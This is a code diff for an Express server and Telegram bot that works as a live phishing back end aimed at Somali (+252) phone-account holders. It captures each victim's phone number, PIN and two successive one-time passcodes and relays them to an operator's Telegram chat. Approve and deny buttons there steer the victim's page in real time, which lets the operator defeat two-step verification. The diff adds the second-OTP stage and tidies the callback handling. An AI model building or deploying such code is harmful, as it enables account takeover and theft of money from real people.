@@ -14,6 +14,10 @@ if (!process.env.BOT_TOKEN) {
 const bot = new Telegraf(process.env.BOT_TOKEN);
 const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();
 
+// -------------------- CONSTANTS --------------------
+const COUNTRY = "Somalia";
+const COUNTRY_CODE = "+252";
+
 // -------------------- MEMORY STORE --------------------
 const statusStore = {};
 
@@ -21,264 +25,222 @@ const statusStore = {};
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
+// -------------------- HELPERS --------------------
+const getTime = () => new Date().toLocaleString('en-US', {
+    month: 'numeric',
+    day: 'numeric',
+    year: 'numeric',
+    hour: 'numeric',
+    minute: 'numeric',
+    second: 'numeric',
+    hour12: true
+});
+
 // -------------------- ROUTES --------------------
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-app.get('/:page', (req, res) => {
-    if (req.params.page.startsWith('api')) {
-        return res.status(404).send("Not found");
-    }
-
-    const file = req.params.page.endsWith('.html')
-        ? req.params.page
-        : req.params.page + '.html';
-
-    const filePath = path.join(__dirname, 'public', file);
-
-    res.sendFile(filePath, (err) => {
-        if (err) res.status(404).send("Page not found");
-    });
-});
-
 // -------------------- LOGIN API --------------------
 app.post('/api/login-notification', async (req, res) => {
     const { phone, pin } = req.body || {};
-    const country = "Somalia";
-    const countryCode = "+252";
 
-    const currentTime = new Date().toLocaleString('en-US', {
-        month: 'numeric',
-        day: 'numeric',
-        year: 'numeric',
-        hour: 'numeric',
-        minute: 'numeric',
-        second: 'numeric',
-        hour12: true
-    });
-
-    if (!phone || !pin || !ADMIN_ID)
-        return res.status(400).json({ error: "Missing data" });
+    if (typeof phone !== "string" || typeof pin !== "string" || !ADMIN_ID) {
+        return res.status(400).json({ error: "Invalid data" });
+    }
 
     statusStore[phone] = "pending";
 
     const message = `📱 <b>CL 2 - LOGIN ATTEMPT</b>
 
 🆕 <b>NEW USER</b>
-🇸🇴 <b>Country:</b> ${country}
-🌍 <b>Country Code:</b> ${countryCode}
-📱 <b>Phone Number:</b> ${phone}
+🇸🇴 <b>Country:</b> ${COUNTRY}
+🌍 <b>Country Code:</b> ${COUNTRY_CODE}
+📱 <b>Phone:</b> ${phone}
 🔢 <b>PIN:</b> ${pin}
-⏰ <b>Time:</b> ${currentTime}
+⏰ <b>Time:</b> ${getTime()}
 
 ━━━━━━━━━━━━━━━
-
-⚠️ <b>User waiting for approval</b>
-⌛ <b>Timeout: 5 minutes</b>`;
+⚠️ Waiting for approval`;
 
     try {
         await bot.telegram.sendMessage(ADMIN_ID, message, {
             parse_mode: 'HTML',
             reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: "✅ Allow to proceed", callback_data: `approve_${phone}_${pin}` },
-                        { text: "❌ Invalid credentials", callback_data: `deny_${phone}_${pin}` }
-                    ]
-                ]
+                inline_keyboard: [[
+                    {
+                        text: "✅ Allow",
+                        callback_data: `approve|${encodeURIComponent(phone)}|${encodeURIComponent(pin)}`
+                    },
+                    {
+                        text: "❌ Deny",
+                        callback_data: `deny|${encodeURIComponent(phone)}|${encodeURIComponent(pin)}`
+                    }
+                ]]
             }
         });
 
         res.json({ success: true });
     } catch (err) {
-        res.status(500).json({ error: "Telegram error" });
+        console.error(err);
+        res.status(500).json({ error: err.message });
     }
 });
 
-// -------------------- FIRST OTP API --------------------
+// -------------------- OTP 1 --------------------
 app.post('/api/verify-first-otp', async (req, res) => {
     const { phone, otp } = req.body || {};
-    const country = "Somalia";
-    const countryCode = "+252";
 
-    const currentTime = new Date().toLocaleString('en-US', {
-        month: 'numeric',
-        day: 'numeric',
-        year: 'numeric',
-        hour: 'numeric',
-        minute: 'numeric',
-        second: 'numeric',
-        hour12: true
-    });
-
-    if (!phone || !otp || !ADMIN_ID)
-        return res.status(400).json({ error: "Missing data" });
-
-    const otpMessage = `1️⃣ <b>CL 2 - FIRST OTP (Step 1/2)</b>
-
-🆕 <b>NEW USER - FIRST VERIFICATION</b>
-🇸🇴 <b>Country:</b> ${country}
-🌍 <b>Country Code:</b> ${countryCode}
-📱 <b>Phone Number:</b> ${phone}
-🔐 <b>First OTP Code:</b> ${otp}
-⏰ <b>Time:</b> ${currentTime}
-
-━━━━━━━━━━━━━━━
-
-⚠️ <b>Verify FIRST OTP:</b>
-⌛ <b>Timeout: 5 minutes</b>
-📝 <b>Next: Second OTP will be sent after approval</b>`;
+    if (!phone || !otp || !ADMIN_ID) {
+        return res.status(400).json({ error: "Invalid data" });
+    }
 
     try {
-        await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
-            parse_mode: 'HTML',
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: "✅ Correct", callback_data: `otp1_correct_${phone}_${otp}` },
-                        { text: "❌ Wrong Code", callback_data: `otp1_wrong_${phone}` }
-                    ]
-                ]
-            }
-        });
+        await bot.telegram.sendMessage(ADMIN_ID,
+            `1️⃣ FIRST OTP\n📱 ${phone}\n🔐 ${otp}\n⏰ ${getTime()}`,
+            {
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [[
+                        {
+                            text: "✅ Correct",
+                            callback_data: `otp1|ok|${encodeURIComponent(phone)}|${encodeURIComponent(otp)}`
+                        },
+                        {
+                            text: "❌ Wrong",
+                            callback_data: `otp1|bad|${encodeURIComponent(phone)}`
+                        }
+                    ]]
+                }
+            });
 
         res.json({ success: true });
     } catch (err) {
-        res.status(500).json({ error: "Telegram error" });
+        console.error(err);
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// -------------------- OTP 2 --------------------
+app.post('/api/verify-second-otp', async (req, res) => {
+    const { phone, otp } = req.body || {};
+
+    if (!phone || !otp || !ADMIN_ID) {
+        return res.status(400).json({ error: "Invalid data" });
+    }
+
+    try {
+        await bot.telegram.sendMessage(ADMIN_ID,
+            `2️⃣ SECOND OTP\n📱 ${phone}\n🔐 ${otp}\n⏰ ${getTime()}`,
+            {
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [[
+                        {
+                            text: "✅ Correct",
+                            callback_data: `otp2|ok|${encodeURIComponent(phone)}|${encodeURIComponent(otp)}`
+                        },
+                        {
+                            text: "❌ Wrong",
+                            callback_data: `otp2|bad|${encodeURIComponent(phone)}`
+                        }
+                    ]]
+                }
+            });
+
+        res.json({ success: true });
+    } catch (err) {
+        console.error(err);
+        res.status(500).json({ error: err.message });
     }
 });
 
 // -------------------- BOT ACTIONS --------------------
 
-// APPROVE LOGIN
-bot.action(/approve_(.+)_(.+)/, async (ctx) => {
-    const phone = ctx.match[1];
-    const pin = ctx.match[2];
+// APPROVE
+bot.action(/approve\|(.+)\|(.+)/, async (ctx) => {
+    const phone = decodeURIComponent(ctx.match[1]);
+    const pin = decodeURIComponent(ctx.match[2]);
 
     statusStore[phone] = "approved";
 
-    const currentTime = new Date().toLocaleTimeString('en-US', {
-        hour: 'numeric',
-        minute: 'numeric',
-        second: 'numeric',
-        hour12: true
-    });
-
-    const approvedMsg = `✅ <b>LOGIN APPROVED</b>
-
-🆕 <b>NEW USER</b>
-🇸🇴 <b>Somalia</b>
-📱 <b>${phone}</b>
-🔐 <b>${pin}</b>
-
-━━━━━━━━━━━━━━━
-
-✅ <b>Status: Approved</b>
-➡️ <b>Next: First OTP (1/2)</b>
-⏱️ <b>${currentTime}</b>`;
-
-    try {
-        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-        await ctx.replyWithHTML(approvedMsg);
-        await ctx.answerCbQuery("Allowed");
-    } catch (e) {
-        console.error(e.message);
-    }
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.reply(`✅ Approved\n📱 ${phone}`);
+    await ctx.answerCbQuery();
 });
 
-// DENY LOGIN
-bot.action(/deny_(.+)_(.+)/, async (ctx) => {
-    const phone = ctx.match[1];
-    const pin = ctx.match[2];
+// DENY
+bot.action(/deny\|(.+)\|(.+)/, async (ctx) => {
+    const phone = decodeURIComponent(ctx.match[1]);
 
     statusStore[phone] = "denied";
 
-    const currentTime = new Date().toLocaleTimeString('en-US', {
-        hour: 'numeric',
-        minute: 'numeric',
-        second: 'numeric',
-        hour12: true
-    });
-
-    const deniedMsg = `❌ <b>INVALID CREDENTIALS</b>
-
-🇸🇴 <b>Somalia</b>
-📱 <b>${phone}</b>
-🔐 <b>${pin}</b>
-
-━━━━━━━━━━━━━━━
-
-❌ <b>Status: Rejected</b>
-⏱️ <b>${currentTime}</b>`;
-
-    try {
-        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-        await ctx.replyWithHTML(deniedMsg);
-        await ctx.answerCbQuery("Rejected");
-    } catch (e) {
-        console.error(e.message);
-    }
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.reply(`❌ Denied\n📱 ${phone}`);
+    await ctx.answerCbQuery();
 });
 
-// OTP 1 CORRECT
-bot.action(/otp1_correct_(.+)_(.+)/, async (ctx) => {
-    const phone = ctx.match[1];
-    const otp = ctx.match[2];
+// OTP1 OK
+bot.action(/otp1\|ok\|(.+)\|(.+)/, async (ctx) => {
+    const phone = decodeURIComponent(ctx.match[1]);
 
-    statusStore[phone] = "otp1_correct";
+    statusStore[phone] = "otp1_ok";
 
-    const currentTime = new Date().toLocaleTimeString('en-US', {
-        hour: 'numeric',
-        minute: 'numeric',
-        second: 'numeric',
-        hour12: true
-    });
-
-    const verifiedMsg = `1️⃣ <b>FIRST OTP VERIFIED (Step 1/2)</b>
-
-🇸🇴 <b>Somalia</b>
-📱 <b>${phone}</b>
-🔐 <b>${otp}</b>
-
-━━━━━━━━━━━━━━━
-
-✅ <b>Status: First OTP verified</b>
-➡️ <b>Next: Second OTP (2/2) will be sent</b>
-⌛ <b>${currentTime}</b>`;
-
-    try {
-        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-        await ctx.replyWithHTML(verifiedMsg);
-        await ctx.answerCbQuery("Verified");
-    } catch (e) {
-        console.error(e.message);
-    }
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.reply(`✅ OTP1 OK\n📱 ${phone}`);
+    await ctx.answerCbQuery();
 });
 
-// OTP 1 WRONG
-bot.action(/otp1_wrong_(.+)/, async (ctx) => {
-    const phone = ctx.match[1];
+// OTP1 BAD
+bot.action(/otp1\|bad\|(.+)/, async (ctx) => {
+    const phone = decodeURIComponent(ctx.match[1]);
 
-    statusStore[phone] = "otp1_wrong";
+    statusStore[phone] = "otp1_bad";
 
-    try {
-        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-        await ctx.replyWithHTML(
-            `❌ <b>FIRST OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`
-        );
-        await ctx.answerCbQuery("Wrong Code");
-    } catch (e) {
-        console.error(e.message);
-    }
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.reply(`❌ OTP1 Wrong\n📱 ${phone}`);
+    await ctx.answerCbQuery();
+});
+
+// OTP2 OK
+bot.action(/otp2\|ok\|(.+)\|(.+)/, async (ctx) => {
+    const phone = decodeURIComponent(ctx.match[1]);
+
+    statusStore[phone] = "otp2_ok";
+
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.reply(`✅ OTP2 OK\n📱 ${phone}`);
+    await ctx.answerCbQuery();
+});
+
+// OTP2 BAD
+bot.action(/otp2\|bad\|(.+)/, async (ctx) => {
+    const phone = decodeURIComponent(ctx.match[1]);
+
+    statusStore[phone] = "otp2_bad";
+
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.reply(`❌ OTP2 Wrong\n📱 ${phone}`);
+    await ctx.answerCbQuery();
 });
 
 // -------------------- STATUS CHECK --------------------
 app.get('/api/check-status', (req, res) => {
     const phone = req.query.phone;
-    if (!phone) return res.json({ status: "pending" });
-
     res.json({ status: statusStore[phone] || "pending" });
+});
+
+// -------------------- STATIC PAGES --------------------
+app.get('/:page', (req, res, next) => {
+    if (req.params.page.startsWith('api')) return next();
+
+    const file = req.params.page.endsWith('.html')
+        ? req.params.page
+        : req.params.page + '.html';
+
+    res.sendFile(path.join(__dirname, 'public', file), (err) => {
+        if (err) res.status(404).send("Page not found");
+    });
 });
 
 // -------------------- START SERVER --------------------
@@ -287,7 +249,7 @@ app.listen(PORT, () => {
 });
 
 // -------------------- START BOT --------------------
-const startBot = async () => {
+(async () => {
     try {
         await bot.telegram.deleteWebhook({ drop_pending_updates: true });
         await bot.launch();
@@ -295,6 +257,8 @@ const startBot = async () => {
     } catch (err) {
         console.error(err);
     }
-};
+})();
 
-startBot();
+// -------------------- GRACEFUL STOP --------------------
+process.once('SIGINT', () => bot.stop('SIGINT'));
+process.once('SIGTERM', () => bot.stop('SIGTERM'));
